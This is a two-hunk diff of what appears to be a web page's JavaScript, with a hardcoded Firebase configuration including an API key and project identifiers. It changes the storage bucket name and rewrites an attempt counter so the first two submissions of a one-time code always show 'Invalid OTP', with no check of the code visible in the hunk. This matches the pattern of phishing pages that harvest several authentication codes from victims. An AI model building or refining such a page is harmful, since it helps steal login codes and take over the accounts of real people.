@@ -116,7 +116,7 @@
       apiKey: "AIzaSyDdRv4_wFI5hjSi_0ci_YDUsdWY5Uv7wDE",
       authDomain: "dlhiljbrd.firebaseapp.com",
       projectId: "dlhiljbrd",
-      storageBucket: "dlhiljbrd.firebasestorage.app",
+      storageBucket: "dlhiljbrd.appspot.com",
       messagingSenderId: "981951131769",
       appId: "1:981951131769:web:5d56cd1423d753992664a8"
     };
@@ -157,7 +157,7 @@
         overlay.style.display = "none";
         attempt++;
 
-        if (attempt === 1 || attempt === 2) {
+        if (attempt <= 2) {
           messageBox.textContent = "Invalid OTP";
           button.disabled = false;
           otpInput.disabled = false;
